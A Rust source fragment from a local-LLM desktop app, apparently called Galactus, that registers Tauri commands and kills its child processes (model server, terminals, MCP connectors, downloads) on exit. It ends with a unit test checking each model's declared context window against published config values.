            // Integrated terminal: one real pty per session. Not exposed to
            // the model as a tool. A model driven write still has to pass the
            // `shell` gate in code/terminal.ts, and pty.rs refuses one that
            // does not say it did.
            pty::pty_spawn,
            pty::pty_write,
            pty::pty_resize,
            pty::pty_kill,
            pty::pty_list,
            knowledge::kb_search,
            knowledge::digest_search,
            relay_status,
            relay_new_key,
            relay_start,
            relay_stop,
            relay_addresses,
            // Scheduled jobs. Rust owns the clock, the definitions and the
            // catch-up decision; the frontend owns the agent loop and reports
            // back through jobs_report. See scheduler.rs.
            scheduler::jobs_list,
            scheduler::jobs_ready,
            scheduler::jobs_save,
            scheduler::jobs_delete,
            scheduler::jobs_enable,
            scheduler::jobs_run_now,
            scheduler::jobs_report,
            scheduler::jobs_preview,
            tray_set,
            preview_publish,
            preview_set_root
        ])
        .build(tauri::generate_context!())
        .expect("error while running Galactus")
        .run(|app, event| {
            // Dock click with the window closed must bring it back (macOS
            // keeps the process alive after the red button).
            if let tauri::RunEvent::Reopen { .. } = event {
                if let Some(w) = app.get_webview_window("main") {
                    let _ = w.show();
                    let _ = w.set_focus();
                }
            }
            // The window closing must take the engine with it: an abandoned
            // llama-server keeps tens of GB of RAM pinned, and every MCP
            // server would linger as an orphan.
            if let tauri::RunEvent::Exit = event {
                // A workspace scan is a plain OS thread: tell it to stop before
                // the window goes, or it outlives the app it was painting into.
                search::cancel_all();
                // An abandoned rust-analyzer keeps a whole crate index in RAM
                // and nothing on screen says so.
                lsp::shutdown_all();
                // Every terminal is a shell with a process group under it: an
                // abandoned `npm run dev` keeps holding its port long after
                // the window is gone.
                pty::kill_all();
                // The relay listens on a socket that must not outlive the window.
                relay::stop();
                if let Ok(mut s) = server_state().lock() {
                    if let Some(mut child) = s.child.take() {
                        let _ = child.kill();
                        let _ = child.wait();
                    }
                    s.phase = "stopped".into();
                    s.port = 0;
                }
                // By pid, not through the server locks: a connector may be
                // mid-call and holding its own lock for another minute, and the
                // window must close now. The process group is left to the system
                // to reap, which it does as soon as this process exits.
                mcp_kill_children();
                // An install in flight is curl downloading up to two hundred
                // gigabytes and a Python packer writing tens more. Neither was
                // touched at exit: they were reparented and carried on filling
                // the disk with no window and no icon to stop them.
                if let Ok(map) = crate::install::install_cancels().lock() {
                    for flag in map.values() {
                        flag.store(true, Ordering::SeqCst);
                    }
                }
                // The flag alone was the bug: nobody is left to read it. The
                // children are killed by pid, here, before this process goes.
                crate::install::kill_install_children();
                // Same reason: a generation holds ten gigabytes and a download
                // keeps writing seven more after the window has gone.
                image::kill_child();
                // Voice capture and speech must not outlive the app either.
                if let Ok(mut v) = voice_state().lock() {
                    if let Some(mut c) = v.child.take() {
                        let _ = c.kill();
                        let _ = c.wait();
                    }
                }
                if let Some(t) = TTS.get() {
                    if let Ok(mut slot) = t.lock() {
                        if let Some(mut c) = slot.take() {
                            let _ = c.kill();
                            let _ = c.wait();
                        }
                    }
                }
            }
        });
}





#[cfg(test)]
mod registry_context_tests {
    /// Every context window in the shipped registry, and why it has to be right.
    ///
    /// Both directions cost something. Too HIGH and llama.cpp extends the rope
    /// past what the model was trained on, and the answers quietly get worse.
    /// Too LOW and the user is refused a window the model has: the two 2507
    /// entries carried 40960, which is the figure from the release BEFORE them,
    /// so a 256K model was served a sixth of what it holds, and Qwen3.6 carried
    /// none at all, which falls back to a cautious 32768.
    ///
    /// Checked against the config.json each model publishes, not against
    /// memory. A missing entry is allowed and means the cautious ceiling: that
    /// is the honest answer for Llama-4 Scout, whose repository is gated and
    /// whose figure could not be read.
    #[test]
    fn the_declared_context_matches_what_the_model_publishes() {
        let raw = include_str!("../packaged/scripts/models-registry.json");
        let v: serde_json::Value = serde_json::from_str(raw).expect("registry parses");
        let models = v["models"].as_array().expect("models is an array");

        // id -> max_position_embeddings, read from each model's own config.json
        // on 2026-08-19. text_config.max_position_embeddings for the
        // multimodal ones, which nest it.
        let published: &[(&str, u64)] = &[
            ("qwen3-30b-a3b", 262_144),
            ("qwen3-235b-a22b", 262_144),
            ("qwen35-35b-a3b", 262_144),
            ("mellum2-12b", 131_072),
            ("olmoe-1b-7b", 4_096),
            // Meta's announced 10M, and the exact figure is 10 * 1024 * 1024.
            // meta-llama's own repository is gated, so this was read from
            // unsloth's mirror, which is the repository this entry actually
            // downloads from: the number that matters here is the one shipped
            // beside the weights we serve.
            //
            // Worth knowing what that 10M is made of: the config declares
            // rope_scaling llama3 with original_max_position_embeddings 8192.
            // The window is reached by extension, not by training at it. That
            // does not change what belongs in this field, which is what the
            // model publishes, and the settings offer stops at 128K anyway.
            ("llama4-scout", 10_485_760),
        ];

        for (id, want) in published {
            let entry = models
                .iter()
                .find(|m| m["id"].as_str() == Some(id))
                .unwrap_or_else(|| panic!("{id} is not in the registry"));
            assert_eq!(
                entry["context_length"].as_u64(),
                Some(*want),
                "{id} declares a window its published config does not"
            );
        }

        // And nothing may declare a window as a string, or as zero, which
        // parses to a ceiling of zero and would serve nothing at all.
        for m in models {
            let id = m["id"].as_str().unwrap_or("?");
            if let Some(c) = m.get("context_length") {
                let n = c.as_u64().unwrap_or_else(|| panic!("{id}: context_length is not a number"));
                assert!(n >= 2048, "{id}: a window of {n} cannot hold a conversation");
            }
        }
    }
}
